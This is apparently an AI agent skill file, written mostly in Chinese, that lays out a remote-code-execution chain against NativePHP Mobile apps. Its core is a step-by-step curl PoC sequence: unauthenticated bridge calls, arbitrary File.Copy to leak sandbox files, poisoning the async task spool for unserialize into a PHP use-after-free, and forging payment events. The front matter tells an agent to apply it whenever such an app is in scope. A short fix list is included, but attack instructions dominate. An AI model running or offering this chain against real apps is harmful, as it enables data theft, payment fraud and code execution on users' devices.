---
name: nativephp-bridge-rce
description: Use when a NativePHP mobile app (nativephp.com) is in scope — unauth /_native/api/* + File.Copy spool poison → RCE.
---

# NativePHP Mobile 桥接面 → 任意文件复制 → unserialize 投毒 → RCE

> 来源：`github.com/ACD421/PHP` zero6（2026-10-23，@acd421）。面是 **NativePHP for Mobile**（Laravel 生态，
> `nativephp/mobile-air` 3.3.4–4.6.0+），打包 PHP **8.4.27 / 8.3.36**（都带 10 月 CVE 补丁，
> 但 **var_destroy 重入 UAF 未修**，见 `php-var-destroy-uaf-rce`）。

## 0. 一句话链

App 内 webview 里的**任意内容** → `POST /_native/api/call`（无鉴权、无 CSRF）→ `File.Copy` **裸路径任意复制**
→ 把攻击者字节覆盖 `storage/framework/async/payload/{id}.task` → `AsyncTask.Dispatch({id})`
→ runner 直接 `unserialize()`（无 `allowed_classes`、无签名）→ PHP 核心 UAF 链 → `zif_system` → RCE。

**不需要内存 bug 也能拿分**：第 2 步单独 = 沙箱任意文件外带（复制到 `public/` 再 `GET /_assets/…`）
+ 事件伪造（`PaymentCompleted` 之类）+ 任意类实例化。

## 1. 攻击面清单（源码级）

| 面 | 路由/函数 | 门禁 | 结论 |
|---|---|---|---|
| 桥接调用 | `POST /_native/api/call` → `nativephp_call($method,$params)` | 仅 `nativephp_can()` = 方法是否注册 | **无鉴权、无 CSRF**（`routes/api.php` 无 middleware 组） |
| 事件注入 | `POST /_native/api/events` → `new $eventClass(...$payload)` | `class_exists` | 任意事件类 + 任意参数 → 触发真实 listener + `NativeCallbacks::resolve` 反序列化 |
| 文件 | `File.Copy` / `File.Move`（Kt/Swift） | **零校验**：无沙箱检查、无 canonical、无 allowlist | 沙箱内任意读/写/覆盖 |
| 异步任务 | `AsyncTaskRunner::runTask` | 封面 `unserialize($payload)`；只有内部 closure 有 HMAC，**task class + args 没有** | 投毒即 RCE |
| 回调缓存 | `NativeCallbacks::resolve` | `unserialize(Cache::pull('native_cb:'.$id.':'.$eventClass))`；**$id/$eventClass 攻击者可控** | 缓存投毒 → 反序列化 |
| 全局事件 | `GlobalEventTransport` | HMAC-SHA256（每设备 Keystore 密钥）+ `hash_equals` | **坚固，别打** |
| 二进制 | `bin.nativephp.com/{branch}/{ver}.json` | Ed25519 签名 manifest + SHA-256 | **坚固** |

跨域为何能打：Android `shouldInterceptRequest` 拦截 webview 内**所有** `127.0.0.1` 请求（不限 origin）；
iOS `PHPSchemeHandler` 对任意页面提供 `php://127.0.0.1`。**form-encoded POST 属 simple request，无预检**，
只有预检类的自定义头被挡——副作用照样触发。嵌套参数用 `params[from]=x&params[to]=y`。

App 内 webview 装不可信内容的现实路径：远程 **iframe**（Android 只拦 `isForMainFrame`，子帧在 app 内加载；
`mixedContentMode=ALWAYS_ALLOW`、`allowFileAccess=true`）· iOS 非白名单 scheme（`data:`/`blob:`/自定义）放行 ·
app 页面 XSS · **release 构建里 `WebContentsDebuggingEnabled(true)`**（`WebViewManager.kt:99`，零售机可 adb 调试）。

## 2. 打（PoC 序列）

```bash
# 1) 确认面在（版本指纹来自 manifest / 静态资源 / UA）
curl -s -X POST https://127.0.0.1:8000/_native/api/call \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'method=File.Copy&params[from]=<app 内任意路径>&params[to]=public/leak.txt'

# 2) 外带（asset handler 无限制地服务 Documents/app/public/**）
curl -s https://app/_assets/leak.txt

# 3) 投毒 spool（先有「攻击者字节落盘」的位置：上传功能最典型）
#    payload 用 php2shell 生成的 zero4/zero5 触发串（见 php-var-destroy-uaf-rce）
curl -s -X POST https://127.0.0.1:8000/_native/api/call \
  -d 'method=File.Copy&params[from]=public/upload/evil.bin&params[to]=storage/framework/async/payload/<uuid>.task'

# 4) 点火
curl -s -X POST https://127.0.0.1:8000/_native/api/call \
  -d 'method=AsyncTask.Dispatch&params[id]=<uuid>'

# 5) 事件伪造 / 任意类实例化
curl -s -X POST https://127.0.0.1:8000/_native/api/events \
  -d 'eventClass=App\Events\Wallet\PaymentCompleted&payload[amount]=99999'
```

回执（作者 lab，`poc_matrix/`）：ASAN `var_unserializer.c:906 READ` on freed 8160-byte block ·
exit=139 SIGSEGV（glibc 野写）· 真实目标上 `uid=0` + 命令执行 marker。4/4 lab 通过。

## 3. 判定 / 面收敛

- 打之前先判 App 是否 NativePHP：包里 `nativephp` 命名空间、`/_native/api/*` 路由、`bin.nativephp.com` 域名、
  `storage/framework/async/` 目录。
- PHP 版本：8.4.27 / 8.3.36 虽带 10 月补丁，但**无 `08f4b64`**（8.5.13 才有）→ var 层 UAF 照样成立；
  4.0.0（php8.4.24）连老 CVE 也中。
- 已死 lanes（别浪费时间）：rfc1867 上传进度（embed SAPI 没有，multipart 在用户态 `MultipartParser.php` 解析）·
  Android 跨 app localhost socket（不存在，全 JNI）· `GlobalEventTransport` 签名伪造 · 零前提直接把攻击者字节送进 `unserialize`。

## 4. 修复方向（给开发看的）

1. `File.*` 加路径 allowlist + `realpath` canonical + 禁 `..`；
2. `/_native/api/*` 加鉴权（每 app 随机 token，注入 webview 时带）与 CSRF；
3. async spool envelope 整体签名（不只 closure），`unserialize(..., ['allowed_classes'=>[...]])`；
4. `NativeCallbacks::resolve` 的 `$id/$eventClass` 做白名单；
5. release 关 `WebContentsDebuggingEnabled`。

## 5. 坑

- 桥接调用打的是 **127.0.0.1 上的 app 内 PHP**，不是网站；从外部扫不到，必须先有「webview 内内容」这个前提。
- form 嵌套参数必须 `params[key]=v` 形式；JSON body 会触发预检被挡。
- 上传落点要找 app 自己的文件保存功能（图片/附件/导出），否则 spool 投毒缺「攻击者字节在盘上」这一环。
- 该链是**框架 0day**，作者已邮件 `sec@php.net` 并公开发布；打真实 app 前先确认目标 App 是否已升级（bridge 加固版本）。
